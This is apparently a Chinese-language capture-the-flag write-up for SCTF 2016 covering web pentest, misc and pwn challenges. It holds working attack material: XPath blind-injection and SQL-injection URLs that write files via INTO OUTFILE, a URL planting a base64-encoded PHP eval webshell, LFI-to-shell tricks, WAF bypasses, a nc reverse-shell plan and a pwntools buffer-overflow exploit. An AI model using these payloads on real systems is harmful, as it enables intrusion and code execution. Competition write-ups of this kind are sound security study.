PENTEST 
ETO(200) 
学到了姿势，盲注还可以这么搞= =测试了几发，发现是 xpath 的注入： 
然后爆破不出来，根据提示说要利用可见字符，于是学到新技能： 
就是利用： 
测试
http://eto.sctf.xctf.org.cn/?action=user&id
=6 or count(//user)=5(确认user节点存在)
http://eto.sctf.xctf.org.cn/?action=user&id=6 or
count(//user/password)=5(确认password字段
存在)
http://eto.sctf.xctf.org.cn/?action=user&id=6 or
string-length(//user[1]/password)=32（确认
YeWenjie的密码是32位）
存在的字符去盲注出密码。一发脚本，得到最后密码，其中有一位注不出来，猜了几个就猜
出是 m 来了= =： 
Homework(200) 
随手注册一发，是发现可以利用’php://filter/read=convert.base64-encode/resource=’去读
到源码，看一下注册的源码。看到了是用 imagecreatefromgif 等函数处理上传图片的，于是
想起了 http://www.freebuf.com/articles/web/54086.html：，然后就是改图片上传去包含就行
了： 
直接执行任意命令，拿到最后 flag： 
Sycshell(200) 
依旧是先看源码，一开始对着 index 上的东西看了好久…在源码里发现内部资料： 
本地添加 host 去访问，发现是张猫，看源码发现大量 jsfuck，找工具进行解密： 
发现目录，访问之： 
用%0b.1e1 可以绕过 pass： 
然后继续，发现能文件包含，读了下 waf： 
可以发现把 phar 以及 zip 禁了，然而…大写绕过就可以了，下面问题来了，如何去 getshell，
又学到了东西，利用 LFI 以及 phpinfo 去写缓存文件。 
参考文章：http://www.freebuf.com/articles/web/79830.html，然后改了发脚本，因为这里可
以用 ZIP 去绕过并读取文件，打包一个 zip 然后去读取不断上传，最终拿到 shell： 
'); 
?> 
DrugMarket1(300) 
首先在 404 源码里面发现真正的网址：http://drug.spentest.com/，访问一发，主页貌似
没有很大用处，看下源码: 
发现存在一个类似于留言评论的输入框，一开始想的是 xss，结果随手试了试文件包含= = 
然后发现居然可以读 session 的临时文件，测试了下，发现是直接把 name 写进 session 去，
然后直接姓名写入一句话，直接成功拿到 shell： 
然而发现上去权限做的好死……尴尬了，又想是渗透题，现在这个的 shell 不是我们最终想要
的那个 shell，于是翻到配置文件，发现数据库的用户名和密码都是套路，很容易猜对了： 
然后登入 drug 的数据库，利用 upadte 去 xss 打到 drug 的后台以及 cookie： 
然后登陆到后台： 
目测是要执行命令，然后主办方说要绕 waf，然后绕啊绕，发现空格也不行，但能用{IFS}去
绕过，同时 nc 监听的端口只能是 80，于是思路就明确了： 
最终 payload 以及 flag： 
一台80端口
没被占用的
vps，nc监听
利用一台
web服务的
vps去wegt
绕过waf拿到
Reverse shell
然后在自己的 vps 上连接就好了： 
Hackme(300) 
写在题目前面的话，这个题目真心不只值 300 分 
拿到题目，发现存在注入点，但是问题在于空格被过滤了，使用/*111*/绕过，可以读
取文件，尝试读取 nginx 的错误日志找到后台，然后尝试读取 php 文件权限不够。下午得
到提示 xss 和管理员会查看备忘录，想到写 xss 到数据库中，发现确实可以 x 到数据但是没
用，结合提示想到利用 xss 去读取浏览器缓存，方法无非就是伪造登录框，hook 登录按
钮，偷窃浏览器的已保存密码之类的，在比赛中因为不可能有人手动输入，所以最后可能
的就是利用浏览器保存的密码。于是发送一个表单过去让他自动填上 username 和
password，之后 get 回本地，得到密码 nizhendeyongyuancaibudaomimade，这是对我们赤
裸裸的嘲讽，登陆发现是文件下载，之后尝试下载本目录下所有文件，发现../ ..\被过滤
了，但是只过滤了一次，使用…/./绕过下载其他的文件。源码见附件。发现一个
session.php，里头源码是 freebuf 的 http://www.freebuf.com/articles/web/90837.html 这个文
章，想到可控 session，然后发现 sql 注入那里可以写文件到/tmp 目录下，之后去读取
php.ini 发现 session 的存放位置是/tmp/，意味着 session 我们完全可控，另一个就是 Path
路径里包含了/tmp/，也就是说当遇到一个未知的类，spl_autoload_register 会自动去 Path
路径里寻找"类名.inc"或者"类名.php"，并自动 include 进来，而/tmp/目录又是完全可控的
（sql 注入写文件）。于是首先
http://hackme.sctf.xctf.org.cn/index.php?id=0.0union/*!00000select*/''into/*111*/outfile'/tmp/albert6.php 写入文件，然后
http://hackme.sctf.xctf.org.cn/index.php?id=0.0union/*!00000select*/load_file/*000*/('/tmp/al
bert6.php')读取文件确认写进去了，然后
http://hackme.sctf.xctf.org.cn/index.php?id=0.0union(/*!11111select*/'a|O:7:"albert6":0:{}'into/
*1234*/outfile'/tmp/sess_albertchangalbertchangalbe')导出 session，然后
带着 session 登陆后台，同时
访问
http://hackme.sctf.xctf.org.cn/05d6a8025a7d0c0eee5f6d12a0a94cc9/main.php?a=assert&b=${f
puts%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2
YWwoJF9QT1NUW2NdKTsgPz4x%29%29};在 web 目录下生成 c.php，密码为 c 之后访问，
成功执行 phpinfo，然后去读取文件，发现并不能成功读取，猜测有 waf，于是在
http://hackme.sctf.xctf.org.cn/05d6a8025a7d0c0eee5f6d12a0a94cc9/目录下写入.user.ini 内容
open_basedir=/，然后就可以直接读取上层目录了，尝试一下写入一个.user.ini 来覆盖上层
目录的 open_basedir 的设置。 
耐心的等待 5 分钟，使用 glob 并结合 file_get_contents，查找一下就能发现 flag  
在这里
发现了 flag 
MISC  
签到题(10) 
直接微博询问即可，跟去年一模一样。。。都是套路 
神秘代码(200) 
拿到题目二进制查看图片发现 0xFF 0xD8 开头，马上搜索文件结尾标志 0xFF 0xD9，找到
压缩包 r.zip。 
r.zip 包可以无限次解压。 
期间尝试修改 zip 突破死循环，使用 Stegsolve 提取，然后做了非常多的无用功。直到官方提
示。 
开始安装 stegdetect。 
找到 ftp://ftp.gwdg.de/pub/linux/misc/ppdd/jphs_05.zip。 
然后尝试提取数据，开始猜口令。SCTF，SCTF2016，CTF，sycsec 等不断尝试。 
最后竟然发现是空口令。 
拿到 flag:SCTF{Hacking!} 
Misc300(300) 
PWN 
Pwn100(100) 
栈溢出，覆盖 argv[1]读 flag。 
脚本： 
#!/usr/bin/env python2 
# -*- coding:utf-8 -*- 
from pwn import * 
import os 
# switches 
DEBUG = 1 
# modify this 
io = remote('58.213.63.30',60001) 
# define symbols and offsets here 
# simplified r/s function 
def ru(delim): 
    return io.recvuntil(delim) 
def rn(count): 
    return io.recvn(count) 
def sl(data): 
    return io.sendline(data) 
def sn(data): 
    return io.send(data) 
def info(string): 
    return log.info(string) 
# define interactive functions here 
# define exploit function here 
def pwn(): 
    ru('?') 
    payload = (504) * 'A' + p64(0x600DC0) 
    sn(payload) 
    io.interactive() 
    return 
if __name__ == '__main__': 
    pwn() 
Pwn200(200) 
整数溢出+FSB 
脚本： 
#!/usr/bin/env python2 
# -*- coding:utf-8 -*- 
from pwn import * 
import os 
# switches 